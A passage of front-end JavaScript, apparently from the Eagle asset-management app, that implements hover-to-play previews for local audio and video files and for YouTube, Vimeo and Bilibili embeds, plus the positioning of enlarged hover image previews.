            });

            $box.find(".thumbnail").prepend($progressbar).prepend($controls).prepend(video);

            mouseX = event.offsetX;
            var duration = video.get(0).duration;
            var mouseTime = (duration * mouseX / $image.width());
            var width = mouseX / $image.width() * 100;

            // $progressbar.find(".current").width("calc(" + width + "%" + " - 2px)");
            // $progressbar.find(".current").width("calc(" + 1 + "%" + " - 2px)");

            updateVideoCursorInterval = setInterval(function () {
                var currentTime = video.get(0).currentTime;
                var duration = video.get(0).duration;
                var percentage = currentTime / duration * 100;
                if (percentage > 1 || percentage < 100) {
                    $progressbar.find(".current").width("calc(" + percentage + "%" + " - 2px)");
                }
                $currentTime.html(getDurationString(currentTime, duration));
            }, 16);

            // mouseTime = Math.round(mouseTime * 100) / 100;

            // if (mouseTime) {
            //     video.get(0).muted = muted;
            //     video.get(0).currentTime = parseFloat(mouseTime);
            // }

            
            // TODO: 确定影片可以播放，在淡出
            var onPlaying = function() {
                video.get(0).removeEventListener("playing", onPlaying);
                $image.hide();
                video.show();
                video.get(0).muted = muted;
            };
            video.get(0).muted = muted;
            video.get(0).addEventListener("playing", onPlaying);
        }
    }, 200);
});

$("#box-container").on('mouseleave', '.box.ext-ts .thumbnail, .box.ext-3gp .thumbnail, .box.ext-360 .thumbnail, .box.mp4 .thumbnail, .box.m4v .thumbnail, .box.mkv .thumbnail, .box.avi .thumbnail, .box.wmv .thumbnail, .box.mpg .thumbnail, .box.webm .thumbnail, .box.mov .thumbnail', removeBoxVideoPlayer);
currentWindow.on('hide', removePlayingAudios);

function removeBoxVideoPlayer(event) {
    if (rectSelecting) return;
    event.stopPropagation();
    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image) return;

    var $image = $box.find("img");

    // 悬停 500ms 在开始播放
    clearTimeout(mouseoverVideoTimeout);
    clearInterval(updateVideoCursorInterval);
    $box.find(".video-progress-bar").remove();
    $box.find(".mute-toggle").off();
    $box.find(".controls").remove();
    var $videos = $box.find("video");
    if ($videos.length > 0) {
        $image.show();
        // $videos.hide();
            try {
                $videos[0].load();
                $videos[0].pause();
                $videos[0].src = "";
                $videos.remove();
            }
            catch (err) {}
        // });
    }
}
// 音频悬停播放
// MP4 文件悬停自动播放
var mouseoverAudioTimeout;
var updateCursorInterval;
var mouseoverAudioProgressTimeout;
var playingAudiosElements = [];
$("#box-container").on('mouseenter', '.box.mp3 .thumbnail, .box.wav .thumbnail, .box.flac .thumbnail, .box.ogg .thumbnail, .box.aac .thumbnail, .box.m4a .thumbnail', function(event) {
    event.stopPropagation();

    // if (dragging) return;
    if (rectSelecting) return;
    if (event.which === 1) return;

    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image) return;
    if (image.noPreview) return;

    // 悬停 500ms 在开始播放
    clearTimeout(mouseoverAudioTimeout);
    mouseoverAudioTimeout = setTimeout(function () {
        var $audios = $box.find("audio");
        if ($audios.length > 0) {
            return;
            $audios[0].pause();
            $audios[0].src = "";
            $audios.remove();
        }
        var $image = $box.find("img");

        var $autoPlayBtn = $('<div class="autoplay-toggle"></div>');
        var autoplay = localStorage["listAudioAutoPlay"] != 'false';
        if (autoplay) {
            $autoPlayBtn.addClass("pause");
        }
        else {
            $autoPlayBtn.removeClass("pause");
        }
        console.log(autoplay);

        var imageWidth = $image.width();
        var imageHeight = $image.height();
        var src = $image.attr("src");
        var imageDir = `${$bodyScope.libraryPath.replace(/#/g, '%23')}/images/`
        $box.find(".audio-progress-bar").remove();
        $box.find(".current-time").remove();
        var $progressbar = $(`<div class="audio-progress-bar"><img src="${src}" style="height: ${imageHeight}px !important; width: ${imageWidth}px !important;"/></div>`);
        var $currentTime = $(`<div class="current-time">00:00</div>`);
        var $progressbarCurosr = $(`<div class="audio-progress-bar-cursor"></div>`);
        var audio = $('<audio/>', {
            id: 'audio',
            src: $bodyScope.getRawUrl(image),
            type: 'audio/' + image.ext,
            controls: false,
            autoplay: autoplay,
            // muted: muted,
            draggable: true,
            loop: false
        });

        var $controls = $('<div class="controls"></div>');
        $controls.append($currentTime);
        $controls.append($autoPlayBtn);
        
        var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
        audio[0].volume = parseInt(volume) / 100;

        playingAudiosElements.push(audio[0]);

        if ($box.find("audio").length === 0) {

            $autoPlayBtn.on("mouseover", function (event) {
                event.stopPropagation();
            });

            $autoPlayBtn.on("mousedown", function (event) {
                event.stopPropagation();
            });

            $autoPlayBtn.on("dblclick", function (event) {
                event.stopPropagation();
            });

            $autoPlayBtn.on("click", function (event) {
                console.log("click");
                event.stopPropagation();
                // audio.get(0).muted = !audio.get(0).muted;
                // muted = audio.get(0).muted;
                if (!audio[0].paused) {
                    audio[0].pause();
                    $autoPlayBtn.removeClass("pause");
                    autoplay = false;
                }
                else {
                    audio[0].play();
                    $autoPlayBtn.addClass("pause");
                    autoplay = true;
                }
                localStorage.setItem("listAudioAutoPlay", autoplay);
            });

            $box.find(".thumbnail").prepend($controls);

            audio.on('ended', function() {
                var delay = setTimeout(function(){
                    this.currentTime = 0;
                    audio[0].play();
                    clearTimeout(delay);
                }, 200);
            });

            audio.on('playing', function() {
                mouseoverAudioProgressTimeout = setTimeout(function () {
                    $box.find(".thumbnail").prepend($progressbar).prepend($progressbarCurosr);
                    $image.on('mousemove.progressCursor', function (event) {
                        var mouseX = event.offsetX;
                        $progressbarCurosr.css({
                            left: `${mouseX}px`
                        });
                    });
                    setTimeout(function () {
                        $image.on('mousedown.duration', function (event) {
                            var mouseX = event.offsetX;
                            var duration = audio.get(0).duration;
                            var mouseTime = (duration * mouseX / $image.width());
                            if (angular.isNumber(mouseTime) && mouseTime > 0) {
                                audio.get(0).currentTime = mouseTime;
                            }
                        });
                    }, 300);
                }, 100);
            });

            // audio.on('ended', function () {
            //     audio.get(0).currentTime = 0;
            //     setTimeout(function () {
            //         audio.get(0).play();
            //     }, 200);
            // });

            updateCursorInterval = setInterval(function () {
                var currentTime = audio.get(0).currentTime;
                var duration = audio.get(0).duration;
                var percentage = currentTime / duration * 100;
                if (percentage > 1 || percentage < 100) {
                    $progressbar.width(percentage + "%");
                }
                else {
                    $progressbar.width("0%");
                }
                $currentTime.html(getDurationString(currentTime, duration));
            }, 16);

            $box.find(".thumbnail").prepend(audio);
        }
    }, 200);
});

$("#box-container").on('mouseleave', '.box.mp3 .thumbnail, .box.wav .thumbnail, .box.flac .thumbnail, .box.ogg .thumbnail, .box.aac .thumbnail, .box.m4a .thumbnail', removeBoxAudioPlayer);
$("#box-container").on('ondragstart', '.box.mp3 .thumbnail, .box.wav .thumbnail, .box.flac .thumbnail, .box.ogg .thumbnail, .box.aac .thumbnail, .box.m4a .thumbnail', removeBoxAudioPlayer);

currentWindow.on('hide', removePlayingAudios);

function removePlayingAudios () {
    if ($bodyScope.selected && $bodyScope.selected[0]) {
        if ($bodyScope.AUDIO_TYPES[$bodyScope.selected[0].ext]) {
            $(".box .thumbnail").has(".audio-progress-bar").trigger("mouseleave");
        }
        else if ($bodyScope.VIDEO_TYPES[$bodyScope.selected[0].ext] ||$bodyScope.selected[0].ext === 'url') {
            $(".box .thumbnail").has(".video-progress-bar").trigger("mouseleave");
            $(".box .iframe-wrap, .video-progress-bar, .mute-toggle").remove();
        }
    }
};

function removeBoxAudioPlayer (event) {
    
    if (event) {
        if (event.originalEvent) {
            if (!event.originalEvent.screenX || !event.originalEvent.screenY) {
                return;
            } 
        }
        event.stopPropagation();
    }

    var $scope = angular.element("body").scope();
    var $box = $(".box").has(event.target);
    var image = $scope.getItemByElement($box[0]);

    if (!image) return;

    var $image = $box.find("img");

    // 悬停 500ms 在开始播放
    clearTimeout(mouseoverAudioTimeout);
    clearTimeout(mouseoverAudioProgressTimeout);
    clearInterval(updateCursorInterval);
    $image.off('mousedown.duration').off('mousemove.progressCursor');
    $box.find(".current-time").remove();
    $box.find(".audio-progress-bar").off().remove();
    $box.find(".audio-progress-bar-cursor").remove();
    $box.find(".autoplay-toggle").off();
    $box.find(".controls").remove();

    if (playingAudiosElements.length > 0) {
        playingAudiosElements.forEach(function (audio) {
            audio.pause();
            audio.src = "";
            $(audio).remove();
        });
        playingAudiosElements = [];
    }
}

var youtubeMouseoverVideoTimeout;
var youtubeUpdateVideoCursorInterval;

$("#box-container").on('mouseenter', '.box.url.youtube .thumbnail', function(event) {
    event.stopPropagation();

    // if (dragging) return;
    if (rectSelecting) return;
    if ($bodyScope.preferences.video.hoverPlay === "false") return;

    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    // 悬停 500ms 在开始播放
    clearTimeout(youtubeMouseoverVideoTimeout);
    clearInterval(youtubeUpdateVideoCursorInterval);
    youtubeMouseoverVideoTimeout = setTimeout(function () {
    	
        var $iframeWrap = $box.find(".iframe-wrap");
        if ($iframeWrap.length > 0) {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
            return;
        }

        var $image = $box.find("img");
        $box.find(".video-progress-bar").remove();
        var $progressbar = $('<div class="video-progress-bar"><div class="current"></div><div class="current-time"></div></div>')
        var $currentTime = $progressbar.find(".current-time");
        var $muteToggle = $('<div class="mute-toggle"></div>');

		var $controls = $('<div class="controls"></div>');
        $controls.append($currentTime);
        $controls.append($muteToggle);
        $controls.hide();

        var muted = localStorage["eagle.list.video.muted"] != 'false';
        if (muted) {
            $muteToggle.addClass("muted");
        }
        else {
            $muteToggle.removeClass("muted");
        }
        var vq = "";
        if ($bodyScope.imageSize.height <= 400) {
        	vq = "sd480";
        }
        else if ($bodyScope.imageSize.height <= 600) {
        	vq = "hq720";
        }
        else {
        	vq = "hq1080";
        }
        var mute = (muted)? "1" : "0";
        var src = `https://www.youtube-nocookie.com/embed/${image.videoID}?autoplay=1&hd=1&vq=${vq}&controls=0&cc_load_policy=0&modestbranding=1&mute=${mute}`;
        var $iframeWrap = $(`<div class="iframe-wrap hide"><iframe src="${src}""></iframe></div>`);
        var $iframe = $iframeWrap.find("iframe");
        var iframe = $iframe[0];

		$box.find(".thumbnail").prepend($iframeWrap);

		$iframe.on("load", () => {
        	setTimeout(initPlayer, 300);
        });

        function initPlayer () {
        	try {
                if (!iframe.contentWindow) return;
				
				$box.find(".thumbnail").prepend($progressbar).prepend($controls);

        		let $doc = $(iframe.contentWindow.document);
        		let video = iframe.contentWindow.document.querySelectorAll("video")[0];
        		let $video = $(video);

        		var $hiddenElems = $doc.find(".ytp-watermark, .ytp-impression-link, .ytp-paid-content-overlay, .ytp-gradient-top, .ytp-show-cards-title");
        		$hiddenElems.remove();
		        
	            var onPlaying = function() {
	                video.removeEventListener("playing", onPlaying);
	                $image.hide();
	            };
	            video.addEventListener("playing", onPlaying);
                $iframeWrap.removeClass("hide");

                $iframeWrap.on('dragstart', function (event) {
	                event.preventDefault();
	                onDragStartContainer(event);
	            });

	            $iframeWrap.on('drag', function () {
	                event.preventDefault();
	                onImageDrag(event);
	            });

	            $iframeWrap.on('dragend', function () {
	                event.preventDefault();
	                onDragEndContainer(event);
	            });

	            $iframeWrap.on('mouseover', function (event) {
	                event.stopPropagation();
	            });

                var autoPlayTimeout;
	            $iframeWrap.on('mousemove', throttle(function (event) {
	                mouseX = event.offsetX;
	                var duration = video.duration;
	                var mouseTime = (duration * mouseX / $image.width());
	                var width = mouseX / $image.width() * 100;

	                $progressbar.find(".current").width("calc(" + width + "%" + " - 2px)");
					$controls.show();

	                mouseTime = Math.round(mouseTime * 100) / 100;
	                if (mouseTime && !isNaN(mouseTime) && isFinite(mouseTime)) {
	                	video.currentTime = parseFloat(mouseTime);
	                    // videoHelper.setCurrentTime(video, parseFloat(mouseTime));
	                    clearTimeout(autoPlayTimeout);
	                    autoPlayTimeout = setTimeout(function () {
	                        try {
	                            if (document.body.contains(video)) {
	                                video.play();
	                            }
	                        } catch (err) {
	                        }
	                    }, 150);
	                }
	            }, 50, true));

	            // $iframeWrap.hide();

	            mouseX = event.offsetX;
	            var duration = video.duration;
	            var mouseTime = (duration * mouseX / $image.width());
	            var width = mouseX / $image.width() * 100;

	            youtubeUpdateVideoCursorInterval = setInterval(function () {
	                var currentTime = video.currentTime;
	                var duration = video.duration;
	                var percentage = currentTime / duration * 100;
	                if (percentage > 1 || percentage < 100) {
	                    $progressbar.find(".current").width("calc(" + percentage + "%" + " - 2px)");
	                }
                    $currentTime.html(getDurationString(currentTime, duration));
	            }, 16);


	            // 静音按钮
	            $muteToggle.on("mousedown", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("dblclick", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("mouseover", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("click", function (event) {
	                event.stopPropagation();
	                video.muted = !video.muted;
	                muted = video.muted;
	                if (muted) {
						$muteToggle.addClass("muted");
					}
					else {
						$muteToggle.removeClass("muted");
					}
	                localStorage.setItem("eagle.list.video.muted", muted);
	            });

        	} catch (err) { console.error(err); }
        }
    }, 200);
});

$("#box-container").on('mouseleave', '.box.url.youtube .thumbnail', function(event) {
    event.stopPropagation();
    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    let $image = $box.find("img");

    // 悬停 500ms 在开始播放
    clearTimeout(youtubeMouseoverVideoTimeout);
    clearInterval(youtubeUpdateVideoCursorInterval);
    $box.find(".video-progress-bar").remove();
    $box.find(".mute-toggle").off().remove();
	$box.find(".controls").remove();
    var $iframeWrap = $box.find(".iframe-wrap");
    if ($iframeWrap.length > 0) {
        $image.show();
        try {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
        }
        catch (err) {}
    }
});
var vimeoMouseoverVideoTimeout;
var vimeoUpdateVideoCursorInterval;

$("#box-container").on('mouseenter', '.box.url.vimeo .thumbnail', function(event) {
    event.stopPropagation();

    // if (dragging) return;
    if (rectSelecting) return;
    if ($bodyScope.preferences.video.hoverPlay === "false") return;

    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    // 悬停 500ms 在开始播放
    clearTimeout(vimeoMouseoverVideoTimeout);
    clearInterval(vimeoUpdateVideoCursorInterval);
    vimeoMouseoverVideoTimeout = setTimeout(function () {
    	
        var $iframeWrap = $box.find(".iframe-wrap");
        if ($iframeWrap.length > 0) {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
            return;
        }

        var $image = $box.find("img");
        $box.find(".video-progress-bar").remove();
        var $progressbar = $('<div class="video-progress-bar"><div class="current"></div><div class="current-time"></div></div>')
        var $currentTime = $progressbar.find(".current-time");
        var $muteToggle = $('<div class="mute-toggle"></div>');

		var $controls = $('<div class="controls"></div>');
        $controls.append($currentTime);
        $controls.append($muteToggle);
        $controls.hide();
		
        var muted = localStorage["eagle.list.video.muted"] != 'false';
        if (muted) {
            $muteToggle.addClass("muted");
        }
        else {
            $muteToggle.removeClass("muted");
        }
        var quality = "";
        if ($bodyScope.imageSize.height <= 480) {
        	quality = "240p";
        }
        else {
        	quality = "360p";
        }
        
        var mute = (muted)? "1" : "0";
        var src = `https://player.vimeo.com/video/${image.videoID}?autoplay=1&controls=0&muted=${mute}&quality=${quality}&title=0`;
        var $iframeWrap = $(`<div class="iframe-wrap hide"><iframe src="${src}""></iframe></div>`);
        var $iframe = $iframeWrap.find("iframe");
        var iframe = $iframe[0];
        
		$box.find(".thumbnail").prepend($iframeWrap);

		$iframe.on("load", () => {
        	setTimeout(initPlayer, 300);
        });

        function initPlayer () {
        	try {
                if (!iframe.contentWindow) return;

                $box.find(".thumbnail").prepend($progressbar).prepend($controls);

        		let $doc = $(iframe.contentWindow.document);
        		let video = iframe.contentWindow.document.querySelectorAll("video")[0];
        		let $video = $(video);

        		var $hiddenElems = $doc.find(".vp-controls-wrapper, .vp-captions");
        		$hiddenElems.remove();
		        
        		$iframeWrap.removeClass("hide");

	            var onPlaying = function() {
	                video.removeEventListener("playing", onPlaying);
	                $image.hide();
	            };
	            video.addEventListener("playing", onPlaying);

                $iframeWrap.on('dragstart', function (event) {
	                event.preventDefault();
	                onDragStartContainer(event);

	            });

	            $iframeWrap.on('drag', function () {
	                event.preventDefault();
	                onImageDrag(event);
	            });

	            $iframeWrap.on('dragend', function () {
	                event.preventDefault();
	                onDragEndContainer(event);
	            });

	            $iframeWrap.on('mouseover', function (event) {
	                event.stopPropagation();
	            });

                var autoPlayTimeout;
	            $iframeWrap.on('mousemove', throttle(function (event) {
	                mouseX = event.offsetX;
	                var duration = video.duration;
	                var mouseTime = (duration * mouseX / $image.width());
	                var width = mouseX / $image.width() * 100;

	                $progressbar.find(".current").width("calc(" + width + "%" + " - 2px)");
					$controls.show();

	                mouseTime = Math.round(mouseTime * 100) / 100;
	                if (mouseTime && !isNaN(mouseTime) && isFinite(mouseTime)) {
	                	video.currentTime = parseFloat(mouseTime);
	                    // videoHelper.setCurrentTime(video, parseFloat(mouseTime));
	                    clearTimeout(autoPlayTimeout);
	                    autoPlayTimeout = setTimeout(function () {
	                        try {
	                            if (document.body.contains(video)) {
	                                video.play();
	                            }
	                        } catch (err) {
	                        }
	                    }, 150);
	                }
	            }, 50, true));

	            // $iframeWrap.hide();

	            mouseX = event.offsetX;
	            var duration = video.duration;
	            var mouseTime = (duration * mouseX / $image.width());
	            var width = mouseX / $image.width() * 100;

	            vimeoUpdateVideoCursorInterval = setInterval(function () {
	                var currentTime = video.currentTime;
	                var duration = video.duration;
	                var percentage = currentTime / duration * 100;
	                if (percentage > 1 || percentage < 100) {
	                    $progressbar.find(".current").width("calc(" + percentage + "%" + " - 2px)");
	                }
                    $currentTime.html(getDurationString(currentTime, duration));
	            }, 16);


	            // 静音按钮
	            $muteToggle.on("mousedown", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("dblclick", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("mouseover", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("click", function (event) {
	                event.stopPropagation();
	                video.muted = !video.muted;
	                muted = video.muted;
	                if (muted) {
						$muteToggle.addClass("muted");
					}
					else {
						$muteToggle.removeClass("muted");
					}
	                localStorage.setItem("eagle.list.video.muted", muted);
	            });

        	} catch (err) { console.error(err); }
        }
    }, 200);
});

$("#box-container").on('mouseleave', '.box.url.vimeo .thumbnail', function(event) {
    event.stopPropagation();
    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    let $image = $box.find("img");

    // 悬停 500ms 在开始播放
    clearTimeout(vimeoMouseoverVideoTimeout);
    clearInterval(vimeoUpdateVideoCursorInterval);
    $box.find(".video-progress-bar").remove();
    $box.find(".mute-toggle").off().remove();
	$box.find(".controls").remove();
    var $iframeWrap = $box.find(".iframe-wrap");
    if ($iframeWrap.length > 0) {
        $image.show();
        try {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
        }
        catch (err) {}
    }
});
var bilibiliMouseoverVideoTimeout;
var bilibiliUpdateVideoCursorInterval;

$("#box-container").on('mouseenter', '.box.url.bilibili .thumbnail', function(event) {
    event.stopPropagation();

    // if (dragging) return;
    if (rectSelecting) return;
    if ($bodyScope.preferences.video.hoverPlay === "false") return;

    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    // 悬停 500ms 在开始播放
    clearTimeout(bilibiliMouseoverVideoTimeout);
    clearInterval(bilibiliUpdateVideoCursorInterval);
    bilibiliMouseoverVideoTimeout = setTimeout(function () {
    	
        var $iframeWrap = $box.find(".iframe-wrap");
        if ($iframeWrap.length > 0) {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
            return;
        }

        var $image = $box.find("img");
        $box.find(".video-progress-bar").remove();
        var $progressbar = $('<div class="video-progress-bar"><div class="current"></div><div class="current-time"></div></div>')
        var $currentTime = $progressbar.find(".current-time");
        var $muteToggle = $('<div class="mute-toggle"></div>');
        var muted = localStorage["eagle.list.video.muted"] != 'false';
        if (muted) {
            $muteToggle.addClass("muted");
        }
        else {
            $muteToggle.removeClass("muted");
        }
        var hq = "";
        if ($bodyScope.imageSize.height <= 600) {
        	hq = "0";
        }
        else {
        	hq = "1";
        }
        
        var mute = (muted)? "1" : "0";
        var src = `https://player.bilibili.com/player.html?bvid=${image.videoID}&autoplay=1&high_quality=${hq}&danmaku=0&as_wide=1`;
        var $iframeWrap = $(`<div class="iframe-wrap hide"><iframe src="${src}""></iframe></div>`);
        var $iframe = $iframeWrap.find("iframe");
        var iframe = $iframe[0];

		$box.find(".thumbnail").prepend($iframeWrap);

		$iframe.on("load", () => {
        	setTimeout(initPlayer, 300);
        });

        async function initPlayer () {
        	try {

                if (!iframe.contentWindow) return;

        		$box.find(".thumbnail").prepend($progressbar).prepend($muteToggle);

        		let $doc = $(iframe.contentWindow.document);

                async function waitElementChange () {
                    return new Promise((resolve, reject) => {
                        let videoElem = iframe.contentWindow.document.querySelector(`.bilibili-player-video`);
                        if (videoElem != null) {
                            let observer = new MutationObserver(() => {
                                let video = iframe.contentWindow.document.querySelectorAll("video")[0];
                                observer.disconnect();
                                resolve(video);
                            });
                            observer.observe(videoElem, {
                                childList: true,
                                subtree: true
                            });
                        }
                    });
                }

                let video = await waitElementChange();
        		let $video = $(video);

        		var $hiddenElems = $doc.find(".bilibili-player-video-pause-panel, .bilibili-player-video-state-play, .bilibili-player-video-control, .bilibili-player-video-sendjumpbar, .bilibili-player-video-suspension");
        		$hiddenElems.remove();
		        
	            var onPlaying = function() {
	                video.removeEventListener("playing", onPlaying);
	                $image.hide();
                    $iframeWrap.removeClass("hide");
	            };
	            video.addEventListener("playing", onPlaying);

                $iframeWrap.on('dragstart', function (event) {
	                event.preventDefault();
	                onDragStartContainer(event);

	            });

	            $iframeWrap.on('drag', function () {
	                event.preventDefault();
	                onImageDrag(event);
	            });

	            $iframeWrap.on('dragend', function () {
	                event.preventDefault();
	                onDragEndContainer(event);
	            });

	            $iframeWrap.on('mouseover', function (event) {
	                event.stopPropagation();
	            });

                var autoPlayTimeout;
	            $iframeWrap.on('mousemove', throttle(function (event) {
	                mouseX = event.offsetX;
	                var duration = video.duration;
	                var mouseTime = (duration * mouseX / $image.width());
	                var width = mouseX / $image.width() * 100;

	                $progressbar.find(".current").width("calc(" + width + "%" + " - 2px)");

	                mouseTime = Math.round(mouseTime * 100) / 100;
	                if (mouseTime && !isNaN(mouseTime) && isFinite(mouseTime)) {
	                	video.currentTime = parseFloat(mouseTime);
	                    // videoHelper.setCurrentTime(video, parseFloat(mouseTime));
	                    clearTimeout(autoPlayTimeout);
	                    autoPlayTimeout = setTimeout(function () {
	                        try {
	                            if (document.body.contains(video)) {
	                                video.play();
	                            }
	                        } catch (err) {
	                        }
	                    }, 150);
	                }
	            }, 50, true));

	            // $iframeWrap.hide();

	            mouseX = event.offsetX;
	            var duration = video.duration;
	            var mouseTime = (duration * mouseX / $image.width());
	            var width = mouseX / $image.width() * 100;

	            bilibiliUpdateVideoCursorInterval = setInterval(function () {
	                var currentTime = video.currentTime;
	                var duration = video.duration;
	                var percentage = currentTime / duration * 100;
	                if (percentage > 1 || percentage < 100) {
	                    $progressbar.find(".current").width("calc(" + percentage + "%" + " - 2px)");
	                }
                    $currentTime.html(getDurationString(currentTime, duration));
	            }, 16);


	            // 静音按钮
	            $muteToggle.on("mousedown", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("dblclick", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("mouseover", function (event) {
	                event.stopPropagation();
	            });

	            $muteToggle.on("click", function (event) {
	                event.stopPropagation();
	                video.muted = !video.muted;
	                muted = video.muted;
	                if (muted) {
						$muteToggle.addClass("muted");
					}
					else {
						$muteToggle.removeClass("muted");
					}
	                localStorage.setItem("eagle.list.video.muted", muted);
	            });

        	} catch (err) { console.error(err); }
        }
    }, 200);
});

$("#box-container").on('mouseleave', '.box.url.bilibili .thumbnail', function(event) {
    event.stopPropagation();
    let $scope = angular.element("body").scope();
    let $box = $(".box").has(this);
    let image = $scope.getItemByElement($box[0]);

    if (!image) return;

    let $image = $box.find("img");

    // 悬停 500ms 在开始播放
    clearTimeout(bilibiliMouseoverVideoTimeout);
    clearInterval(bilibiliUpdateVideoCursorInterval);
    $box.find(".video-progress-bar").remove();
    $box.find(".mute-toggle").off().remove();
    var $iframeWrap = $box.find(".iframe-wrap");
    if ($iframeWrap.length > 0) {
        $image.show();
        try {
            $iframeWrap.find("iframe")[0].src = "";
            $iframeWrap.remove();
        }
        catch (err) {}
    }
});
var HoverPreview = {
    isShow: false,
    lastElem: undefined,
    keyupTimeout: undefined,
    zoomBtnTimeout: undefined,
    loadRawTimeout: undefined,
    showTimeout: undefined,
    $container: $("#hover-preview-container"),
    show: function (event) {
        if (!HoverPreview.lastElem) return;
        if (HoverPreview.isShow) return;
        if ($("input:focus").length > 0) { return; }
        HoverPreview.isShow = true;
        clearTimeout(HoverPreview.loadRawTimeout);
        clearTimeout(HoverPreview.showTimeout);
        var $hoverImage = HoverPreview.$container.find("img");
        var $imageWraper = HoverPreview.$container.find(".image-wraper");
        var image = $bodyScope.getItemByElement(HoverPreview.lastElem.parentElement);
        if (image.noPreview) return;
        var thumbnailPath = FileUrlHelper.getLastestThumbnailUrl(image);
        var offset = $(HoverPreview.lastElem).offset();
        var x = offset.left;
        var y = offset.top;
        var width = Math.min(480, image.width);
        var height = Math.min(480, image.height);
        var boxWidth = $(HoverPreview.lastElem).width();
        var windowWidth = $(window).width() - 20;
        var windowHeight = $(window).height() - 20;
        var boxHeight = Math.min($(HoverPreview.lastElem).height(), windowHeight);
        var imageX = 0;
        var imageY = 0;
        var imageWidth = 0;
        var imageHeight = 0;

        var getMaxImageSizeRatio = function (w1, h1, w2, h2) {
            if (w2 > w1 && h2 > h1) return 1;
            var ratio;
            if (w2 < h2) {
                ratio = h1/h2;
            }
            else {
                ratio = w1/w2;
            }
            return ratio;
        }

        var rotateString = "";
        // if (image.orientation) {
        //     switch (image.orientation) {
        //         case 8:
        //             rotateString = "rotate(-90deg)"
        //             break;
        //         case 7:
        //             rotateString = "rotate(-270deg) scaleX(-1)"
        //             break;
        //         case 6:
        //             rotateString = "rotate(90deg)"
        //             break;
        //         case 5:
        //             rotateString = "rotate(270deg) scaleX(-1)"
        //             break;
        //         case 4:
        //             rotateString = "scaleY(-1)"
        //             break;
        //         case 3:
        //             rotateString = "scaleX(-1) scaleY(-1)"
        //             break;
        //         case 2:
        //             rotateString = "scaleX(-1)"
        //             break;
        //     }
        // }

        $hoverImage.attr("src", thumbnailPath);

        // 计算上下左右哪一个区域，图片可以最大呈现
        var topArea = { name: "top", x: 0, y: 0, w: windowWidth, h: y };
        var bottomArea = { name: "bottom", x: 0, y: y + boxHeight, w: windowWidth, h: windowHeight - y - boxHeight };
        var leftArea = { name: "left", x: 0, y: 0, w: x, h: windowHeight };
        var rightArea = { name: "right", x: x + boxWidth, y: 0, w: windowWidth - boxWidth - x, h: windowHeight };

        var maxDisplayWidthArea;
        var maxDisplayHeightArea;
        var finalArea;

        if (topArea.h > bottomArea.h) {
            maxDisplayWidthArea = topArea;
        }
        else {
            maxDisplayWidthArea = bottomArea;
        }

        if (leftArea.w > rightArea.w) {
            maxDisplayHeightArea = leftArea;
        }
        else {
            maxDisplayHeightArea = rightArea;
        }

        var ratioW = getMaxImageSizeRatio(image.width, image.height, maxDisplayWidthArea.w, maxDisplayWidthArea.h);
        var ratioH = getMaxImageSizeRatio(image.width, image.height, maxDisplayHeightArea.w, maxDisplayHeightArea.h);

        // console.log(`${maxDisplayWidthArea.name}: ${ratioW}`);
        // console.log(`${maxDisplayHeightArea.name}: ${ratioH}`);

        // 相同时，偏好左右，除非元件在画面外
        if (ratioW === ratioH) {
            // 偏好上下
            if (y < 0 || y + boxHeight > windowHeight) { 
                finalArea = maxDisplayWidthArea; 
                finalArea.ratio = ratioW;
            }
            // 默认左右
            else { 
                finalArea = maxDisplayHeightArea; 
                finalArea.ratio = ratioW;
            }
        }
        else if (ratioW > ratioH) { 
            if (maxDisplayWidthArea.name === "top" && y - image.height * ratioW < 0) {
                finalArea = maxDisplayHeightArea; finalArea.ratio = ratioH;
            }
            else if (maxDisplayWidthArea.name === "bottom" && y + boxHeight + image.height * ratioW > windowHeight) {
                finalArea = maxDisplayHeightArea; finalArea.ratio = ratioH;
            }
            else {
                finalArea = maxDisplayWidthArea; 
                finalArea.ratio = ratioW; 
            }
        }
        else { finalArea = maxDisplayHeightArea; finalArea.ratio = ratioH; }

        // console.log(`在 ${finalArea.name} 呈现`);

        // 上下的左右对齐逻辑
        // x 轴一律置图片中心点对齐，然后把超过的部分抓回来
        // 图靠上，y 轴位置 = 当前缩图 y - 放大后图片高
        // 图靠下，y 轴位置 = 当前缩图 y + 缩图高
        // finalArea.ratio = Math.min(finalArea.ratio, 1);
        var transform;
        if (finalArea.name === "top") {
            imageWidth = Math.min(finalArea.w, image.width);
            imageHeight = Math.min(finalArea.h, imageWidth / image.width * image.height, image.height);
            imageWidth = Math.min(finalArea.w, imageHeight / image.height * image.width);
            transform = `translateX(${imageX}px) translateY(${imageY + 10}px) ${rotateString}`;
        }
        else if (finalArea.name === "bottom") {
            imageWidth = Math.min(finalArea.w, image.width);
            imageHeight = Math.min(finalArea.h, imageWidth / image.width * image.height, image.height);
            imageWidth = Math.min(finalArea.w, imageHeight / image.height * image.width);
            transform = `translateX(${imageX}px) translateY(${imageY - 10}px) ${rotateString}`;
        }

        // 左右的左右对齐逻辑
